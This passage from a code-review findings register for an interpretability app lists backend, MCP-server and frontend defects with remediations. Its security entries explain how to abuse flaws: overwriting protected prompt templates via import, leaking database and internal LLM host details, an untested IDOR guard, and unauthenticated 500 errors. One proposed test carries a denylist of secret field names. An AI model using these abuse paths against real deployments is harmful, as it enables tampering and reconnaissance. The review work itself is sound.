- **Evidence:** **verified-by-live-repro** (reviewer reproduced the round-trip against the real code)
- **Doc reference:** memory `pydantic-alias-renames-on-serialisation`; PADR IDL-16
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** `validation_alias=AliasChoices("schema","dataset_schema")` + `serialization_alias="schema"`, as `cluster_profile.py:184` already does; give `DatasetMetadata` `extra="allow"` or merge rather than replace. Extend the no-plain-alias sweep to every schema reachable from a request body, and rewrite the pinning assertions — then re-run against current code as a negative control.
- **Effort:** M

---

### MIS-E2E-108 — Template import overwrites protected system templates
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/services/labeling_prompt_template_service.py:515-539` (import overwrite branch); guards present at `:207-209` (update) and `:261` (delete); endpoint `api/v1/endpoints/labeling_prompt_templates.py:402-410`
- **Claim:** `update_template` and `delete_template` both refuse a system template (`if db_template.is_system: raise ValueError("Cannot modify system templates")`). The **import** path has neither guard: it matches on `name` alone and overwrites `system_message`, `user_prompt_template`, `description` and more unconditionally, and will promote the row to `is_default`. The endpoint takes `import_request: dict` with no Pydantic model at all. Note the create branch immediately below (`:545-558`) *is* careful, pinning `is_default=False, is_system=False` — the overwrite branch simply was not given the same treatment.
- **Failure scenario:** An import naming a seeded system template (e.g. *"Context-Aware Labeling"*, seeded `is_system=True` at `scripts/seed_context_aware_template.py:103`) with `overwrite_duplicates: true` replaces its prompt body and makes it the default. Every subsequent bulk-labeling run — including runs billing the operator's OpenAI key against their corpus — executes the imported instructions. The UI still shows the template as protected and `PATCH`/`DELETE` still refuse it, so the tamper is invisible from the surface that is supposed to be authoritative.
- **Evidence:** verified-by-live-repro (all three branches read; the seed scripts confirm `is_system=True`)
- **Doc reference:** PADR IDL-21 (Context-Aware Labeling Template Strategy)
- **Verification (R3):** pending
- **Proposed remediation:** Guard the overwrite branch on `is_system`, refuse `is_default` promotion from imported data, and validate the body with a schema rather than `dict`. Related: MIS-E2E-045 records two *migrations* overwriting the same templates without an `is_system` guard — same rule missed in two places.
- **Effort:** S

---

### MIS-E2E-109 — NLP analysis writes across extraction boundaries
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/features.py:805-810`; `backend/src/workers/nlp_analysis_tasks.py:102-109`, `:219-234`
- **Claim:** `POST /extractions/{extraction_id}/analyze-nlp` validates the path extraction, then forwards the body's `feature_ids` untouched. The worker drops the extraction scope entirely when ids are supplied — `Feature.id.in_(feature_ids)` with **no `extraction_job_id` filter**, where the no-ids branch is correctly scoped. `request.feature_ids` is an unconstrained `Optional[List[str]]`.
- **Failure scenario:** A caller posts to a small extraction and passes ids from a large one with `force_reprocess: true`. Every one of those features has its curated `nlp_analysis` overwritten and its `FeatureAnalysisCache` row deleted, while the progress counters are written onto the **path** extraction — so the extraction whose data was destroyed shows no activity, and the one showing activity holds none of the results. Silent in both directions. The sibling reset route at `features.py:956-958` scopes correctly, which makes this an oversight; of 11 two-path-parameter routes, all 11 bind child to parent, and this is the body-parameter case that was missed.
- **Evidence:** verified-by-live-repro (both worker branches read and contrasted with the correct sibling)
- **Doc reference:** PADR IDL-9
- **Verification (R3):** pending
- **Proposed remediation:** Filter on both columns; better, validate in the endpoint and 400 naming any id that does not belong.
- **Effort:** S

---

### MIS-E2E-110 — IDL-22's error-message hardening never covered the modules written after it
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/neuronpedia.py:587`; `saes.py` (13 `str(e)` sites, e.g. `:663`); `jlens.py` (11), `circuit_discovery.py` (10), `neuronpedia.py` (8); `models.py:1318-1323`
- **Claim:** IDL-22's hardening (commit `b153781`) bounded itself to `status_code=500` responses across a fixed file list. Modules written afterwards were never swept. The sharpest instance: `GET /neuronpedia/local-status` deliberately withholds the DSN (`:571` returns `"db_url_set": bool(...)`) and then leaks its components through a bare `except Exception` around an asyncpg pool acquire — asyncpg messages carry the target and identity (`Connect call failed ('10.x.x.x', 5432)`, `password authentication failed for user "neuronpedia"`, `database "…" does not exist`). `saes.py` is the only module with bare `except Exception` → `HTTPException(500, f"...{str(e)}")` wrapping a pure DB read, so raw SQLAlchemy text reaches the client. `GET /models/tasks/{task_id}` returns `str(task_result.info)` plus the whole `info` object — unbounded worker-side exception text for any task id.
- **Failure scenario:** Reconnaissance about an **adjacent** system. The accepted posture concedes miStudio's own data to anyone on the LAN; it does not concede the host, port, database and role of the Neuronpedia deployment beside it.
- **Evidence:** verified-by-live-repro (the site read; the `str(e)` inventory counted per module; the reviewer confirmed the circuits/validation sites all catch **narrow custom** exception types and are genuinely fine)
- **Doc reference:** PADR IDL-22 — regressed by scope, not by reversion
- **Verification (R3):** pending
- **Proposed remediation:** Classify at the site (`str(e)` only for `ValueError`/`ValidationError`, log the rest) — the correct pattern is already written at `cluster_profiles.py:230`. Extend the sweep to the four unswept modules and the task-status passthrough, then add a check that fails on `except Exception as e:` reaching a response body anywhere in `api/`.
- **Effort:** M

---

### MIS-E2E-111 — An internal LLM endpoint URL is published in a response its sibling withholds
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** P3
- **Type:** security
- **Location:** `backend/src/schemas/enhanced_labeling.py:20` (`endpoint: str`, `celery_task_id`); contrast `backend/src/schemas/labeling.py:171-212`
- **Claim:** `EnhancedLabelingJobResponse` is `from_attributes=True` over `EnhancedLabelingJob` and exposes `endpoint` — the configured LLM server URL. The sibling schema over the same subsystem, `LabelingStatusResponse`, reads from a table holding `openai_api_key`, `openai_compatible_endpoint` and `celery_task_id`, and **omits all three**. Two schemas over one domain, one treating the endpoint as secret and the other publishing it.
- **Failure scenario:** `GET /features/{id}/label/enhanced/latest` returns e.g. `"endpoint": "http://ollama.hitsai.local:11434/v1"` — an internal hostname and port not otherwise advertised. Combined with MIS-E2E-105, a page in an operator's browser can read it, handing an external attacker a named internal service.
- **Evidence:** verified-by-live-repro (both schemas read and contrasted)
- **Doc reference:** PADR IDL-18, IDL-22
- **Verification (R3):** pending
- **Proposed remediation:** Drop `endpoint` and `celery_task_id`; return a stable `"local"`/`"openai"` label if the UI needs one. Because these schemas are `from_attributes=True` over tables holding secrets, add a test instantiating each response schema against its ORM model and asserting a denylist (`*_api_key`, `*endpoint*`, `*_token`, `*_path`, `*traceback*`) never appears in `model_fields`.
- **Effort:** S

---

## P05 — R2 (mutation controls)

---

### MIS-E2E-112 — The API's only IDOR guard has no test
- **Phase / Round:** P05 / R2
- **Source:** mutation control M18
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/api/v1/endpoints/trainings.py:534`
- **Claim:** Neutralising the parent-ownership check on `DELETE /trainings/{training_id}/checkpoints/{checkpoint_id}` left **277 tests green**. Of the 11 routes with two or more path parameters, ten bind child to parent inside the query itself; this is the only one that fetches by child id and enforces ownership with a separate post-fetch comparison — and its own comment states the invariant: *"Never allow a checkpoint to be deleted via an unrelated training's URL."*
- **Failure scenario:** The single line standing between a caller and deleting any checkpoint through any training's URL is unprotected by any test. Checkpoint deletion is irreversible and removes files from disk. A refactor that reorders the fetch, or an "optimisation" that folds the 404 branches together, silently removes the only cross-tenant boundary the API has — with a green suite.
- **Evidence:** **verified-by-mutation** — M18 landed (confirmed by `git diff --stat`), 277 tests green, restore verified clean
- **Doc reference:** none
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** One test: create two trainings, take a checkpoint of the second, `DELETE` it through the first's URL, assert 404 and that the row and its file survive. Then re-run M18 as a negative control.
- **Effort:** S

---

## P06 — MCP server

---

### MIS-E2E-113 — The 200-HTML failure mode was fixed on one of the two clients
- **Phase / Round:** P06 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/mcp_server/client.py:65` (unguarded `response.json()` on the 2xx path); the fix exists at `backend/src/mcp_server/millm_client.py:80-102`
- **Claim:** `MiStudioClient` — the **only** path from the MCP server to the backend — calls `response.json()` on any 2xx without guarding the content type. A misrouted `MISTUDIO_API_URL` that lands on the frontend SPA returns `200 text/html`, and the agent gets a bare `JSONDecodeError` rather than a `BackendError`. `millm_client.py:80-102` handles exactly this, documents it as *F20 R3-17*, and its own comment warns the fix *"was never carried across"*.
- **Failure scenario:** This is the recorded defect that motivated writing `test_millm_client_failure_paths.py` in the first place: *"a 200 HTML page from a misrouted ingress used to reach the agent as an empty SUCCESS, so it would read 'nothing is steering' and activate into a contention."* The mitigation was applied to the miLLM client and the note that it had not been generalized was written down — and it still has not been. Every MCP tool that reads from the backend inherits it.
- **Evidence:** **verified-by-live-repro** — the reviewer reproduced against a MockTransport; the two clients' 2xx paths read and contrasted
- **Doc reference:** memory `millm-circuit-consolidation-increment`; `docs/mcp-contract.md`
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Lift the content-type guard out of `millm_client` into a shared helper both clients use, so "carried across" is structural rather than remembered.
- **Effort:** S
- **Also at `client.py:56`:** `response.json().get("detail", …)` raises `AttributeError` for a JSON array or scalar error body — not caught by the adjacent `except json.JSONDecodeError` — so the status code and verbatim detail (BR-6.2) are lost.

---

### MIS-E2E-114 — The published MCP contract lists three endpoints that do not exist, and a test pins them
- **Phase / Round:** P06 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/mcp_server/contract.py:78`; the committed `docs/mcp-contract.md:47` and `:208`; `backend/tests/unit/test_mcp_contract_generated.py`
- **Claim:** The AST scraper that generates the contract records plain `dict.get("x")` calls as HTTP endpoints. Verified in the **committed** file:
  ```
  get_steering_samples  | GET /validation-manifests … GET kind  GET manifests
  get_steering_result   | GET /steering/async/result/{…}        GET status
  ```
  `GET kind`, `GET manifests` and `GET status` are not endpoints — they are `dict.get("kind")`, `.get("manifests")` and `.get("status")`. The `_submit` branch at `contract.py:68` already carries the `startswith("/")` filter that would exclude them; the sibling branch does not.
- **Failure scenario:** `docs/mcp-contract.md` is the published description of the MCP surface — one of only two files the `sync-to-clean` filter **deliberately preserves** in the public mirror, because external consumers and the mirror's own tests need it. It advertises three endpoints that do not exist. And because `test_mcp_contract_generated.py` regenerates and diffs, **it pins the bogus rows as correct**: any fix to the scraper fails the test until the committed file is regenerated, and until then the test actively defends the error.
- **Evidence:** **verified-by-live-repro** — the rows read from the committed file; the missing filter compared against the sibling branch
- **Doc reference:** PADR IDL-26; `.github/workflows/sync-to-clean.yml:38-44` (which preserves this file explicitly)
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Apply the same `startswith("/")` filter at `:78`, regenerate, commit both. This is a test pinning a defect rather than preventing it — the class the review lessons call out.
- **Effort:** S

---

### MIS-E2E-115 — Calling a read-only tool permanently changes what an unauthenticated endpoint advertises
- **Phase / Round:** P06 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/mcp_server/tools/howto.py:589` (`os.environ.setdefault("MILLM_API_URL", "http://millm.invalid")`); `backend/src/mcp_server/server.py:163` (`/health` re-reads `settings.millm_api_url` per request)
- **Claim:** `mistudio_howto` — a documentation tool — calls `_all_tools()`, which **mutates the process environment** with `os.environ.setdefault("MILLM_API_URL", "http://millm.invalid")` so it can enumerate the millm categories. `/health` re-reads that variable per request instead of using the build-time wiring.
- **Failure scenario:** On a deployment with no miLLM configured, the first `mistudio_howto` call permanently flips the unauthenticated `/health` endpoint to advertising `millm: available=false` — a product that was never wired. Verified before/after by the reviewer. Two defects compound: a read-only tool with a global side effect, and a health endpoint reading mutable process state rather than the configuration the server was actually built with. The health endpoint is the one surface whose entire job is to report what *is*.
- **Evidence:** **verified-by-live-repro** — the `setdefault` read at source; the before/after `/health` difference reproduced by the reviewer against a built server
- **Doc reference:** PADR IDL-26
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Enumerate the millm tools without touching `os.environ` (pass the flag through, or build a throwaway settings object). Have `/health` report the build-time wiring the server was constructed with.
- **Effort:** S

---

### MIS-E2E-116 — A malformed miLLM URL makes gated tools raise, defeating the gate's contract
- **Phase / Round:** P06 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/mcp_server/health_gate.py:140`
- **Claim:** The `gated()` decorator's contract is that an unavailable product yields `{"unavailable": …, "reason": …}` and **never raises** — the server instructions tell agents exactly that. `httpx.InvalidURL` derives from `Exception`, not `HTTPError`, so it escapes the handler: a malformed `MILLM_API_URL` makes every gated tool **raise**, and because the exception skips the cache write there is no negative caching, so `/health` reports *"not probed yet"* forever and every call re-probes.
- **Failure scenario:** A typo'd URL turns a documented graceful degradation into 32 raising tools, with the health endpoint permanently unable to say why. The MCP server's own instructions promise the opposite: *"When miLLM is down its tools return `{"unavailable": "millm", "reason": …}` — report the reason, don't retry in a loop."*
- **Evidence:** **verified-by-live-repro** (reviewer reproduced the raise and the absent cache write)
- **Doc reference:** `SERVER_INSTRUCTIONS`; PADR IDL-26
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Catch `Exception` in the probe, or add `InvalidURL` explicitly, and always write the negative cache entry.
- **Effort:** S

---

### MIS-E2E-117 — A non-ASCII bearer token returns 500 instead of 401 on a LAN-reachable port
- **Phase / Round:** P06 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/mcp_server/server.py:81` (`BearerAuthMiddleware`)
- **Claim:** `hmac.compare_digest` raises `TypeError` on a non-ASCII string. Starlette latin-1-decodes headers, so a bearer value containing a non-ASCII byte reaches `compare_digest` and the middleware raises — verified **HTTP 500** rather than 401, from an unauthenticated request on a port the config describes as *"LAN-reachable by design"*.
- **Failure scenario:** An unauthenticated caller can make the MCP server emit a 500 and a server-side traceback at will. It leaks that the header is compared and nothing about the secret, so this is availability and noise rather than disclosure — but it is the authentication middleware, and the same latin-1 hazard was noted (and not filed) on the backend's internal HMAC routes in P05. Two instances of one root cause.
- **Evidence:** **verified-by-live-repro** (reviewer reproduced the 500 through a Starlette TestClient)
- **Doc reference:** PADR IDL-26
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Encode both sides to bytes before comparing, or reject non-ASCII with a 401 before the compare. Fix both instances together.
- **Effort:** S

---

### MIS-E2E-118 — A cancelled background probe logs a traceback on every graceful shutdown
- **Phase / Round:** P06 / R1
- **Source:** /code-review high
- **Severity:** P3
- **Type:** bug
- **Location:** `backend/src/mcp_server/health_gate.py:91` (`lambda t: t.exception()` as a done callback)
- **Claim:** Calling `.exception()` on a cancelled task re-raises `CancelledError` inside the done callback, producing `ERROR asyncio: Exception in callback` on every graceful shutdown that overlaps an in-flight probe.
- **Failure scenario:** Cosmetic, but it puts an ERROR-level traceback in the logs on a normal shutdown, which is exactly the noise that trains an operator to ignore shutdown errors.
- **Evidence:** verified-by-live-repro (reviewer reproduced)
- **Doc reference:** none
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Guard with `if not t.cancelled()`.
- **Effort:** S

---

### MIS-E2E-119 — The reachability harness's payload assertion is a hand-list covering 16 of 116 tools
- **Phase / Round:** P06 / R2
- **Source:** mutation control M21
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/tests/unit/test_reachability.py:263` (`EXPECTED_CALLS`), `:329-359` (`TestCallerReachability`)
- **Claim:** The class docstring states: *"Registration proves a tool is exposed. This proves it does something, and the right something: **re-pointing a path or deleting the call body fails here and nowhere else**."* Re-pointing `get_circuit` from `/circuits/{id}` to `/WRONG-PATH/{id}` left **all 31 reachability tests green**. `EXPECTED_CALLS` is a hand-written dict with **16 entries**; the live registry holds **116 tools**.
- **Failure scenario:** This is not a criticism of the harness — shapes 1 and 2 are parametrized off `CATEGORY_MODULES`/`MILLM_CATEGORY_MODULES`, cover all 116, and M20 proved they bite hard on the exact defect they were written for. It is that the **one shape which is not registry-derived** is the one that proves a tool does the right thing, and it covers 14%. A tool added today gets registration coverage automatically and call coverage only if someone remembers to add a row.
  The incidental backstop that *did* catch M21 — the contract regeneration diff — is weaker than it appears: per MIS-E2E-114 the committed contract already carries three bogus endpoint rows that the same test pins as correct, so it defends the recorded path whatever that path is.
- **Evidence:** **verified-by-mutation** — M21 landed (confirmed), 31 reachability tests green, killed only by `test_mcp_contract_generated.py`; `EXPECTED_CALLS` counted at 16 against a live registry of 116
- **Doc reference:** `CLAUDE.md` Reachability gate — *"Assert the **payload and the call count** — 'was called' passes against a call sending the wrong arguments"*
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Make the gap visible rather than filling all 100 by hand: parametrize over the **registry**, assert every tool issues at least one call with a path starting `/`, and treat absence from `EXPECTED_CALLS` as an explicit `xfail`-style opt-out that has to be written down. That turns "nobody added a row" from silence into a listed exemption — the same discipline `test_causal_language_audit.py` already uses, where exemptions are `SKIPPED` with a reason so they stay visible in the output.
- **Effort:** M

---

## P07 — Frontend state layer

---

### MIS-E2E-120 — Every WebSocket event fires N+1 times after N reconnects
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `frontend/src/contexts/WebSocketContext.tsx:61-68`
- **Claim:** The `connect` handler re-attaches every handler already in `eventHandlersRef.current`:
  ```js
  // IMPORTANT: Re-attach existing handlers FIRST (for reconnections)
  // This must happen before processing pending handlers to avoid double-registration
  const existingHandlers = new Map(eventHandlersRef.current);
  existingHandlers.forEach((handlers, event) => {
    handlers.forEach(handler => { socket.on(event, handler); });
  });
  ```
  socket.io-client **does not detach handlers on disconnect** — verified against 4.8.1, whose `onclose` clears only acks. So the handlers are still registered and `socket.on` adds a *second* registration. After N reconnects every event fires N+1 times. The comment reasons explicitly about double-registration and has the direction backwards: it protects the *pending* handlers from being registered twice while double-registering the *existing* ones.
- **Failure scenario:** `reconnectionAttempts: Infinity` makes reconnects routine, not exceptional. The clearest visible consequence is duplicate checkpoints — `addCheckpoint` appends with no dedupe, so a training that reconnects three times shows each subsequent checkpoint four times. Every progress handler, store patch and counter behind this transport is multiplied the same way. **No test file exists for this context** (MIS-E2E-016), and it is the single connection every realtime feature depends on.
- **Evidence:** **verified-by-live-repro** — the re-attach block read at source; the reviewer verified socket.io-client 4.8.1's `onclose` behaviour
- **Doc reference:** PADR IDL-1, IDL-12
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Drop the re-attach entirely — the handlers survive. If a defensive re-attach is wanted, `socket.off(event, handler)` first.
- **Effort:** S

---

### MIS-E2E-121 — A stale request permanently disables cancellation and the request timeout
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `frontend/src/stores/featuresStore.ts:661` (the `.catch` path), `:655` (the same clobber on success)
- **Claim:** An older cleanup request's completion handler nulls the **newer** request's abort controller and timeout handle — it clears the shared refs without checking that it still owns them.
- **Failure scenario:** Two rapid feature switches are enough. After that, the abort controller is `null` for the rest of the session, so no subsequent request can be cancelled and the 5-second hard timeout never fires again. The failure is permanent, silent, and triggered by ordinary UI use — clicking through features quickly is the primary interaction of the Feature Browser.
- **Evidence:** plausible (read-only) — both clobber sites read
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Capture the controller in a local, and null the ref only if it is still the one this request installed — the standard generation-token pattern. Related: MIS-E2E-124 is the same missing pattern one level up.
- **Effort:** S

---

### MIS-E2E-122 — Rebalance flips a suppressing feature to amplifying
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `frontend/src/stores/steeringStore.ts:827`, and the same defect at `:878`
- **Claim:** The budget rebalance derives a member's **sign** from a strength value that the over-budget branch has already zeroed. A negative (suppressing) feature therefore comes back positive.
- **Failure scenario:** Reachable in a single slider drag past the budget and back. Negative strength is not an edge case in this product — the cluster-definition contract carries `sign ∈ {1,-1}` and the canonical rule is that **a member's negative strength *is* its direction**. So the interaction silently inverts what a feature does: a cluster tuned to suppress a behaviour now amplifies it, at a strength the budget model chose, with no error and no visual cue.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-29 (cluster strength budget model); memory `cluster-member-meta-contract-rev` — "CANONICAL SIGN RULE: negative strength is already directional"
- **Verification (R3):** pending
- **Proposed remediation:** Capture the sign before the zeroing branch.
- **Effort:** S

---

### MIS-E2E-123 — A mid-batch refresh locks the Generate button permanently
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `frontend/src/stores/steeringStore.ts:2538`
- **Claim:** `isGenerating` and `batchState` are written into the **persisted** slice of the store, and nothing clears them on rehydration. After a refresh mid-batch, `selectCanGenerateBatch` returns false forever, and `abortBatch` cannot fix it because it drives the in-memory loop that no longer exists.
- **Failure scenario:** Refresh the page during a batch — or close the tab and come back — and the Steering panel's primary action is disabled with no way to re-enable it from the UI. Recovery requires clearing `localStorage`. Transient UI state persisted alongside genuine preferences.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-27
- **Verification (R3):** pending — reproducible in the browser; belongs to P08's live pass
- **Proposed remediation:** Exclude in-flight state from the `persist` partializer, or clear it in `onRehydrateStorage`.
- **Effort:** S

---

### MIS-E2E-124 — Three concurrency defects in the steering and feature stores
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/stores/steeringStore.ts:2100`, `:2415`; `frontend/src/stores/featuresStore.ts:395`
- **Claim:**
  1. **`generateCombined` lacks the double-submit guard `generateComparison` has** (`:2100`). A double-click shows a *"Superseded…"* error banner to the user while an orphaned GPU task runs to completion — so the UI reports a failure and the GPU is occupied by work nobody will read.
  2. **A recovery guard is dead** (`:2415`): it compares `comparison_id` — format `cmp_<12 hex>`, generated client-side and independently — against an 8-character Celery task-id prefix. The two can never match by construction, so recovery is always skipped; and a coincidental match would silently skip it for the wrong reason.
  3. **No request sequencing on feature detail/examples/token-analysis** (`:395`). A slow response for feature A renders under feature B, with no error — the classic stale-render race, and the same missing pattern as MIS-E2E-121 one level up.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-27; `.claude/context/agents/qa_engineer.md` records the sibling `pendingBatchResolver` leak
- **Verification (R3):** pending
- **Proposed remediation:** Give `generateCombined` the guard its sibling has; delete or repair the dead comparison; add a generation token to the three feature fetches.
- **Effort:** M

---

### MIS-E2E-125 — Polling stops on one transient error and can render stale state after it stops
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/utils/polling.ts:186`, `:203`
- **Claim:** Two defects in the shared polling helper:
  1. **A single transient fetch error terminates polling permanently** (`:186`), and the only caller **discards the returned handle**, so there is no way to restart it.
  2. **No in-flight guard on the interval** (`:203`): a slow earlier response can call `onUpdate` with stale non-terminal state *after* polling has already stopped.
- **Failure scenario:** A 10-minute model download stops updating after one 502 and never resumes — the download itself completes, but the UI shows it in progress indefinitely. Or, via (2), a finished model is stranded displaying "downloading" because a late response overwrote the terminal state. Both leave the UI permanently wrong about a job that actually succeeded, which is the failure mode this repo has recorded before under "the frontend fallback keys on connection, not data freshness".
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-1
- **Verification (R3):** pending
- **Proposed remediation:** Tolerate N consecutive errors before giving up; guard the interval on an in-flight flag and discard responses that arrive after stop.
- **Effort:** S

---

### MIS-E2E-126 — Two smaller state defects: an abandoned channel resubscribes forever, and a duplicate drops its SAE
- **Phase / Round:** P07 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/contexts/WebSocketContext.tsx:165` (`unsubscribe`); `frontend/src/stores/steeringStore.ts:1244` (`duplicateFeature`)
- **Claim:**
  1. `unsubscribe` does not clear `pendingSubscriptionsRef`, so a channel the user abandoned is subscribed on the next connect and **re-subscribed on every reconnect thereafter**. Compounds with MIS-E2E-120.
  2. `duplicateFeature` omits `sae_id`, so duplicating a member of a multi-layer circuit falls back to the request-level SAE — the wrong layer. That is the exact 422 the circuit loader documents guarding against, and the same wrong-basis class as MIS-E2E-064 reached from the UI instead of the API.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-31
- **Verification (R3):** pending
- **Proposed remediation:** Clear the pending entry on unsubscribe; carry `sae_id` through the duplicate.
- **Effort:** S

---

## P07 — R2 (mutation controls)

---

### MIS-E2E-127 — The auto-baseline formula's own test file samples only where the slope cannot matter
- **Phase / Round:** P07 / R2
- **Source:** mutation control M22
- **Severity:** P1
- **Type:** test-gap
- **Location:** `frontend/src/utils/steeringStrength.test.ts:25-36`; the constant at `frontend/src/utils/steeringStrength.ts:25`
- **Claim:** Changing `BASELINE_SLOPE` from **2.6 to 2.4** — the coefficient of the IDL-27 frequency auto-baseline, `S = clamp(2.9 − 2.6·freq, 1, 3)` — left **75 tests green** across the formula's dedicated test file and the steering store's.
- **Failure scenario:** The test file samples the function at exactly three kinds of point, and the slope is invisible at all three: at **freq 0** the slope term is multiplied by zero; at **freq 0.9 and 1.0** the result clamps to the floor; and the remaining assertions are inequalities against `BASELINE_MAX`/`BASELINE_MIN`, which almost any slope satisfies. Computed, the two coefficients agree at every point the tests examine and differ only in the mid-range:
  ```
  slope 2.6 | f=0 -> 2.9 | f=0.5 -> 1.60 | f=0.9 -> 1 | f=1 -> 1
  slope 2.4 | f=0 -> 2.9 | f=0.5 -> 1.70 | f=0.9 -> 1 | f=1 -> 1
  ```
  The arithmetic that *would* distinguish them is written in a **comment** — `2.9 - 2.6*1 = 0.3 → clamp` — where nothing executes it. The formula sets the default steering strength for every feature the user has not tuned, so a silent change to it changes what the product does by default across the whole Steering panel.
- **Evidence:** **verified-by-mutation** — M22 landed (confirmed), 75 tests green, restore verified clean; the divergence computed independently
- **Doc reference:** PADR IDL-27; memory `steering-011-baseline-and-color-literal`
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Assert an exact mid-range value — `computeBaselineStrength(0.5).value` — where the slope is the only thing determining the answer. One line. When writing a test for a formula, first ask which input makes the candidate behaviours **differ**; every sample here was chosen from the boundaries, where they cannot.
- **Effort:** S
- **Note:** this is the J-Lens arc's recorded trap in the frontend — there, a fixture whose `W_U` was `torch.eye(...)` made a unit-norm fix deletable with 63 tests green, because the fixture was already unit-norm. Same shape: the sample points make both behaviours identical.

---

## P08 — Frontend UI

---

### MIS-E2E-128 — The prune dialog says "report on" while the task permanently deletes
- **Phase / Round:** P08 / R1
- **Source:** /code-review high
- **Severity:** **P0** *(data loss)*
- **Type:** bug
- **Location:** `frontend/src/components/panels/SettingsPanel.tsx:1306` (confirm text) and `:1318` (success toast); the task reads live settings at `backend/src/workers/prune_checkpoints.py:147` and `:237`
- **Claim:** Both the confirmation dialog and the success toast read `preview.policy.dry_run` — a **snapshot** captured when the preview was fetched. The Celery task re-reads `checkpoint_prune_dry_run` from settings at execution time. The two can disagree, and nothing re-fetches the preview when the setting changes.
- **Failure scenario:** Preview while dry-run is on → untick "dry run" and Save → click "Prune now". The confirmation says *"This will **report on** 12 checkpoint file(s) for train_xxx. Continue?"*, the toast says *"Dry-run prune queued"*, and the task **permanently deletes all twelve**. A destructive, irreversible action behind a dialog stating the opposite of what will happen — and the dialog is the product's only confirmation step. Note the code does have the `'PERMANENTLY DELETE'` branch; it simply consults stale state to choose it.
- **Evidence:** **verified-by-live-repro at source** — the confirm/toast expressions read; the worker's live `policy.dry_run` reads confirmed at two sites
- **Doc reference:** PADR IDL-39 (step-granular checkpoint retention, shipped *disabled + dry-run*); memory recorded for Feature 21 — *"a boolean setting must fail to its DEFAULT, not to False (for `dry_run`, False means delete)"*
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Re-fetch the preview immediately before showing the dialog, or have the backend return the policy it will actually apply and confirm against that. The general rule: a confirmation for a destructive action must be rendered from the state the action will use, never from a snapshot.
- **Effort:** S

---

### MIS-E2E-129 — The Diff view shades agreement as disagreement and reports every rank off by one
- **Phase / Round:** P08 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug *(the "wrong results presented as correct" class)*
- **Location:** `frontend/src/components/jlens/ReadoutGrid.tsx:293` (`rankOf`), and the `diffColor` / tooltip consumers
- **Claim:** `rankOf` returns a **1-based** rank; `diffColor` and the tooltip are written for **0-based**. Four consequences: cells where the two lenses **agree** receive the amber disagreement shading; every tooltip rank is off by one (showing `#2` for rank 1); the "same top token" legend swatch is **unreachable**; and the shading directly contradicts the `first diverge at L…` badge, which is computed correctly by `firstDisagreement`.
- **Failure scenario:** The Diff view exists to show where the Jacobian lens starts seeing something the logit lens does not — that crossing is the quantity the mode was built for. It currently colours agreement as divergence, so the visual answer is wrong everywhere, while a correct badge sits beside it saying something different. A user reading the grid draws a conclusion about the model from an off-by-one.
- **Evidence:** plausible (read-only) — the index-base mismatch read at source
- **Doc reference:** 023_FPRD|JLens_Readout_Viewer; PADR IDL-40
- **Verification (R3):** pending — visible in the browser against a live readout
- **Proposed remediation:** Make `rankOf` and its consumers agree on one base, and assert the legend's "same top token" swatch is reachable — an unreachable legend entry is the cheap tell that the mapping is wrong.
- **Effort:** S

---

### MIS-E2E-130 — Three Settings defects: a swept model name, an unawaited delete, and cross-card reversion
- **Phase / Round:** P08 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/components/panels/SettingsPanel.tsx:362`, `:559`, `:862`
- **Claim:**
  1. **`getByCategory('endpoints')` sweeps in non-endpoints** — `openai_compatible_model` lands in the "Saved Endpoints" list beside the URLs. The model name renders as if it were a URL, and its trash icon **silently deletes the configured labeling model**.
  2. **`remove('ollama_url')` is neither awaited nor caught** while the field is cleared optimistically, so a failed DELETE looks like success and the value reappears on reload. The same missing handling is in **all five** other mutation handlers in this file.
